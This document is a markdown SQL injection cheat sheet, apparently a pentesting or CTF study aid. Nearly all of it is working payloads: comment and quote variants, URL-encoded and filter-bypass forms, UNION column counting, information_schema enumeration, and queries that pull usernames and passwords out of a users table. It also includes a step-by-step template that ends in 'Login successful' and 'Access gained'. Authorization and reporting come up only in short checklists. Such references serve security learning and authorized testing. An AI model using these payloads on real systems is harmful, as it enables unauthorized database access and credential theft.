# SQL Injection - Basics to Remember

## 🎯 Essential Checklist for Every SQL Injection Test

This document contains the fundamental rules and techniques you should **ALWAYS** remember and try when performing SQL injection testing.

---

## 1. Comment Syntax - Try All Variants

SQL comments are used to terminate the original query and prevent syntax errors.

### Always Test These Comment Styles

```sql
-- (space after dashes)
--
--+
#
/**/
;%00
```

### Where to Use Comments

**At the end of your payload:**
```sql
' OR 1=1--
' OR 1=1-- 
' OR 1=1#
' OR 1=1/*
```

### Why Multiple Comment Styles?

| Comment | Database | Notes |
|---------|----------|-------|
| `--` (with space) | MySQL, PostgreSQL, MSSQL | Most common, space is required |
| `--` (no space) | May work in some contexts | Try both versions |
| `#` | MySQL | Alternative to `--` |
| `/**/` | MySQL, MSSQL | Multi-line comment |
| `;%00` | Some contexts | Null byte injection |

### Testing Example

```sql
# Test 1: Double dash with space
admin'-- 

# Test 2: Double dash without space
admin'--

# Test 3: Hash
admin'#

# Test 4: Multi-line comment
admin'/*

# Test 5: Semicolon with null byte
admin';%00
```

**Rule**: If one comment style doesn't work, **try all others** before giving up.

---

## 2. Quote Variations - Try Both Single and Double

Databases accept both single quotes (`'`) and double quotes (`"`) in different contexts.

### Always Test Both Quote Types

```sql
# Single quotes
'
''
' OR '1'='1

# Double quotes
"
""
" OR "1"="1
```

### Why This Matters

**Example vulnerable query:**
```sql
SELECT * FROM users WHERE username = '$input'
```

**Could also be:**
```sql
SELECT * FROM users WHERE username = "$input"
```

**You won't know until you test both!**

### Basic Detection Tests

```sql
# Test with single quote
admin'

# Test with double quote
admin"

# Test with both (escaped)
admin''
admin""
```

### In Payloads - Use Consistent Quotes

**When extracting data, match your quote style:**

```sql
# If single quotes work - use single quotes in WHERE clause:
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name='users'--

# If double quotes work - use double quotes:
" UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name="users"--
```

---

## 3. URL Encoding - Essential Skill

When testing via URL parameters, special characters must be encoded.

### Quick Encoding Reference

| Character | URL Encoded | Description |
|-----------|-------------|-------------|
| Space | `+` or `%20` | Use + for readability |
| `'` | `%27` | Single quote |
| `"` | `%22` | Double quote |
| `#` | `%23` | Hash (important!) |
| `--` | `%2D%2D` | Double dash |
| `=` | `%3D` | Equals |
| `/` | `%2F` | Forward slash |
| `\` | `%5C` | Backslash |
| `(` | `%28` | Opening parenthesis |
| `)` | `%29` | Closing parenthesis |

### Burp Suite Encoding

**Keyboard Shortcut**: `Ctrl+U` (or `Cmd+U` on Mac)

**How to use:**
1. Highlight the text in Burp Repeater
2. Press `Ctrl+U` to encode
3. Press `Ctrl+Shift+U` to decode

**Right-click method:**
1. Highlight text
2. Right-click
3. Convert selection → URL → URL-encode key characters

### Manual Encoding Examples

**Before encoding:**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**After encoding:**
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**Or fully encoded:**
```sql
%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables%2D%2D
```

### When to Encode

✅ **Always encode when:**
- Testing via URL parameters (`?id=1`)
- Spaces are in your payload
- Using `#` (becomes `%23`)
- Browser/server strips characters

❌ **Don't encode when:**
- Testing via POST body (usually)
- Using Burp Repeater (it handles it)
- In direct SQL query testing

---

## 4. String Quoting in Payloads

When passing strings in SQL statements, **ALWAYS** use quotes around string values.

### Critical Rule: Strings Need Quotes

```sql
# ❌ WRONG - No quotes around table name
WHERE table_name=users

# ✅ CORRECT - Quotes around table name
WHERE table_name='users'
```

### Common Scenarios

#### Scenario 1: Table Names
```sql
# Wrong
WHERE table_name=users_abcdef

# Correct - Single quotes
WHERE table_name='users_abcdef'

# Correct - Double quotes (if that's what works)
WHERE table_name="users_abcdef"
```

#### Scenario 2: Column Names
```sql
# Wrong
WHERE column_name=password

# Correct
WHERE column_name='password'
```

#### Scenario 3: Database Names
```sql
# Wrong
WHERE table_schema=sqli_db

# Correct
WHERE table_schema='sqli_db'
```

#### Scenario 4: Test Values
```sql
# Wrong
UNION SELECT abc, def--

# Correct
UNION SELECT 'abc', 'def'--
```

### When Quotes Are NOT Needed

**Numbers:**
```sql
# Correct - No quotes for numbers
WHERE id=1
WHERE user_id=123
ORDER BY 3
```

**Functions:**
```sql
# Correct - No quotes for functions
database()
version()
user()
NULL
```

**Mixed example:**
```sql
# Correct usage
UNION SELECT 
    'test',           -- String needs quotes
    123,              -- Number no quotes
    database(),       -- Function no quotes
    NULL              -- NULL no quotes
FROM information_schema.tables 
WHERE table_name='users'  -- String needs quotes
```

---

## 5. Start with Basic Commands

Always test from simplest to most complex. Don't jump to advanced techniques.

### Level 1: Detection (Always Start Here)

```sql
# Test 1: Single quote
'

# Test 2: Double quote
"

# Test 3: Boolean true
' OR 1=1--

# Test 4: Boolean false
' OR 1=2--

# Test 5: AND statement
' AND 1=1--
```

### Level 2: Basic UNION

```sql
# Test column count - Start with 1
' UNION SELECT NULL--

# Increment until no error
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

### Level 3: Simple Information Gathering

```sql
# Database name
' UNION SELECT database(),NULL--

# Database version
' UNION SELECT version(),NULL--

# Current user
' UNION SELECT user(),NULL--
```

### Level 4: Enumeration

```sql
# List tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

# List columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Level 5: Data Extraction

```sql
# Extract data
' UNION SELECT username,password FROM users--
```

### Progression Checklist

```
□ Step 1: Confirm vulnerability (', ", OR 1=1)
□ Step 2: Find column count (UNION SELECT NULL)
□ Step 3: Get database name (database())
□ Step 4: List tables (information_schema.tables)
□ Step 5: List columns (information_schema.columns)
□ Step 6: Extract data (SELECT from target table)
```

**Rule**: Master each level before moving to the next. Don't skip steps.

---

## 6. The "Try Everything" Checklist

### Before Giving Up, Try ALL Combinations

#### Quote Combinations
```sql
'
"
''
""
\'
\"
```

#### Comment Combinations
```sql
--
-- 
#
/*
*/
;--
```

#### Boolean Logic
```sql
' OR 1=1--
' OR '1'='1'--
' OR "1"="1"--
" OR 1=1--
" OR "1"="1"--
```

#### UNION Variations
```sql
' UNION SELECT NULL--
' UNION ALL SELECT NULL--
'+UNION+SELECT+NULL--
'/**/UNION/**/SELECT/**/NULL--
```

#### Encoding Variations
```sql
# Normal
' OR 1=1--

# URL encoded
'+OR+1=1--

# Double encoded
%2527+OR+1%3D1--

# Mixed case (bypass filters)
' oR 1=1--
' UnIoN SeLeCt--
```

---

## 7. Testing Methodology - Quick Reference

### Phase 1: Initial Detection (2 minutes)

```sql
# Test each of these:
?id=1'
?id=1"
?id=1' OR 1=1--
?id=1' AND 1=1--
?id=1' AND 1=2--
```

**Look for:**
- Error messages
- Different page content
- Blank pages
- HTTP 500 errors

---

### Phase 2: Column Enumeration (5 minutes)

```sql
# Try incremental NULL values:
?id=1' UNION SELECT NULL--
?id=1' UNION SELECT NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL--

# Or use ORDER BY:
?id=1' ORDER BY 1--
?id=1' ORDER BY 2--
?id=1' ORDER BY 3--
```

**Look for:**
- Page loads normally = correct column count
- Error = wrong column count

---

### Phase 3: Visibility Check (2 minutes)

```sql
# Test which columns display:
?id=1' UNION SELECT 'A','B','C'--
```

**Look for:**
- Which letters appear on page
- Note visible column positions

---

### Phase 4: Information Gathering (5 minutes)

```sql
# Database name:
?id=1' UNION SELECT database(),NULL,NULL--

# All tables:
?id=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

# Tables in current database:
?id=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

---

### Phase 5: Column Enumeration (3 minutes)

```sql
# Find columns in specific table:
?id=1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Don't forget:** Replace `'users'` with YOUR actual table name

---

### Phase 6: Data Extraction (2 minutes)

```sql
# Extract the goods:
?id=1' UNION SELECT username,password,email FROM users--

# Or with group_concat:
?id=1' UNION SELECT group_concat(username),group_concat(password),NULL FROM users--
```

---

## 8. Common Mistakes to Avoid

### ❌ Mistake 1: Forgetting Comments
```sql
# Wrong - Original query continues
' UNION SELECT NULL,NULL

# Correct - Comment terminates query
' UNION SELECT NULL,NULL--
```

---

### ❌ Mistake 2: Wrong Quote Type
```sql
# If single quotes work, don't use double:
WHERE table_name="users"

# Use matching quotes:
WHERE table_name='users'
```

---

### ❌ Mistake 3: No URL Encoding
```sql
# Wrong - Spaces break the URL
?id=1' UNION SELECT NULL--

# Correct - Encoded spaces
?id=1'+UNION+SELECT+NULL--
```

---

### ❌ Mistake 4: Missing Quotes on Strings
```sql
# Wrong
WHERE table_name=users

# Correct
WHERE table_name='users'
```

---

### ❌ Mistake 5: Starting Too Advanced
```sql
# Don't start with:
?id=1' UNION SELECT group_concat(column_name) FROM information_schema.columns...

# Start with:
?id=1'
```

---

### ❌ Mistake 6: Not Testing All Comment Styles
```sql
# Don't just try:
' OR 1=1--

# Try all:
' OR 1=1--
' OR 1=1-- 
' OR 1=1#
' OR 1=1/*
```

---

### ❌ Mistake 7: Giving Up Too Soon
```sql
# Just because this doesn't work:
' OR 1=1--

# Doesn't mean these won't:
" OR 1=1--
' OR '1'='1'--
'+OR+1=1--
'/**/OR/**/1=1--
```

---

## 9. Quick Payload Reference

### Detection Payloads

```sql
# Basic detection
'
"
' OR 1=1--
' OR '1'='1
' AND 1=1--
' AND 1=2--

# URL-encoded
%27
%22
'+OR+1=1--
'+AND+1=1--
```

### Column Count Payloads

```sql
# UNION method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# ORDER BY method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Information Gathering

```sql
# Database name
' UNION SELECT database()--
' UNION SELECT database(),NULL--

# Version
' UNION SELECT version()--

# User
' UNION SELECT user()--

# Current database tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
```

### Enumeration

```sql
# List all tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

# List all columns from a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# List all databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
```

### Data Extraction

```sql
# Basic extraction
' UNION SELECT username,password FROM users--

# With group_concat
' UNION SELECT group_concat(username),group_concat(password) FROM users--

# With custom separator
' UNION SELECT group_concat(username,':',password SEPARATOR '; '),NULL FROM users--
```

---

## 10. Testing Template

Use this template for every SQL injection test:

```
Target URL: _______________________________
Parameter: _______________________________

[ ] Phase 1: Detection
    [ ] Tested '
    [ ] Tested "
    [ ] Tested ' OR 1=1--
    [ ] Vulnerability confirmed: YES / NO

[ ] Phase 2: Column Count
    [ ] Method used: UNION / ORDER BY
    [ ] Column count: _______
    [ ] Visible columns: _______

[ ] Phase 3: Database Information
    [ ] Database name: _______
    [ ] Database version: _______
    [ ] Current user: _______

[ ] Phase 4: Tables
    [ ] Tables found: _______________________
    [ ] Target table: _______

[ ] Phase 5: Columns
    [ ] Columns in target table: _____________
    [ ] Username column: _______
    [ ] Password column: _______

[ ] Phase 6: Data Extraction
    [ ] Credentials extracted: _______
    [ ] Admin account found: _______
    [ ] Password: _______

[ ] Phase 7: Exploitation
    [ ] Login successful: YES / NO
    [ ] Access gained: _______
```

---

## 11. Essential Tools Settings

### Burp Suite Setup

**Proxy Settings:**
```
Proxy → Options → Intercept Client Requests
☑ Intercept requests based on these rules
☑ URL matches: .*
```

**Repeater Settings:**
```
Repeater → Options
☑ Unpack gzip/deflate
☑ Follow redirections: Never
☑ Process cookies in redirections
```

**Useful Shortcuts:**
- `Ctrl+R` - Send to Repeater
- `Ctrl+I` - Send to Intruder
- `Ctrl+U` - URL encode
- `Ctrl+Shift+U` - URL decode
- `Ctrl+Space` - Trigger autocomplete

---

## 12. Pre-Flight Checklist

Before every SQL injection test, verify:

```
✓ Burp Suite is running
✓ Browser proxy is configured
✓ Intercept is on
✓ Target URL is correct
✓ Parameter to test is identified
✓ Legal authorization is obtained
✓ Testing environment is appropriate
```

---

## 13. Post-Exploitation Checklist

After successful exploitation:

```
✓ Document all payloads used
✓ Screenshot evidence captured
✓ All extracted data recorded
✓ Access level achieved noted
✓ Timestamps recorded
✓ Report written
✓ Vulnerabilities reported (if bug bounty)
✓ Test environment cleaned up
```

---

## 14. SQL Injection Cheat Sheet Summary

### Must Remember Rules

1. ✅ **Try all comment styles**: `--`, `#`, `/**/`
2. ✅ **Try both quote types**: `'` and `"`
3. ✅ **Always URL encode**: Use `Ctrl+U` in Burp
4. ✅ **Quote all strings**: `table_name='users'` not `table_name=users`
5. ✅ **Start simple**: Detection → Column count → Enumeration → Extraction
6. ✅ **Test systematically**: Don't skip basic tests
7. ✅ **Document everything**: Keep notes of what works
8. ✅ **Be patient**: Try all variations before giving up

---

## 15. Quick Decision Tree

```
Is there a parameter in the URL?
    ├─ YES → Test for SQLi
    │   ├─ Try ' → Error?
    │   │   ├─ YES → Vulnerable!
    │   │   └─ NO → Try "
    │   │       ├─ YES → Vulnerable!
    │   │       └─ NO → Try ' OR 1=1--
    │   │           ├─ YES → Vulnerable!
    │   │           └─ NO → Try other techniques
    └─ NO → Look for other injection points
```

---

## 16. The Golden Rules

### Rule #1: Always Test Basics First
Don't start with complex payloads. Test `'` before testing `' UNION SELECT...`

### Rule #2: Try All Comment Styles
`--`, `-- `, `#`, `/**/` - One will work if the others don't

### Rule #3: Match Your Quote Style
If `'` works for detection, use `'` in your payloads

### Rule #4: URL Encode Everything
When in doubt, press `Ctrl+U`

### Rule #5: Quote Your Strings
`table_name='users'` not `table_name=users`

### Rule #6: Don't Give Up
Try every combination before concluding it's not vulnerable

### Rule #7: Document Everything
Write down what works - you'll need it later

### Rule #8: Practice Makes Perfect
The more you test, the faster you'll get

---

## 17. Final Reminders

### Before You Start
- [ ] Do you have authorization?
- [ ] Is Burp Suite configured?
- [ ] Have you identified the parameter?
- [ ] Do you have a testing plan?

### During Testing
- [ ] Are you trying all quote types?
- [ ] Are you trying all comment styles?
- [ ] Are you URL encoding?
- [ ] Are you documenting your findings?

### After Success
- [ ] Did you extract all necessary data?
- [ ] Did you document the vulnerability?
- [ ] Did you screenshot evidence?
- [ ] Did you report responsibly?

---

**Remember**: SQL injection is about patience and systematic testing. Try everything, document everything, and never give up too soon!

---

## Quick Reference Card

**Print this and keep it handy:**

```
┌─────────────────────────────────────────┐
│     SQL INJECTION QUICK REFERENCE       │
├─────────────────────────────────────────┤
│ COMMENTS:  --  #  /**/                  │
│ QUOTES:    '  "                         │
│ ENCODE:    Ctrl+U (Burp)                │
│                                         │
│ DETECTION:                              │
│   '                                     │
│   ' OR 1=1--                            │
│                                         │
│ COLUMNS:                                │
│   ' UNION SELECT NULL--                 │
│   ' ORDER BY 1--                        │
│                                         │
│ DATABASE:                               │
│   ' UNION SELECT database()--           │
│                                         │
│ TABLES:                                 │
│   ' UNION SELECT table_name FROM        │
│   information_schema.tables--           │
│                                         │
│ COLUMNS:                                │
│   ' UNION SELECT column_name FROM       │
│   information_schema.columns            │
│   WHERE table_name='users'--            │
│                                         │
│ EXTRACT:                                │
│   ' UNION SELECT username,password      │
│   FROM users--                          │
└─────────────────────────────────────────┘
```

---

**Master these basics, and you'll be ready for any SQL injection challenge!** 🎯
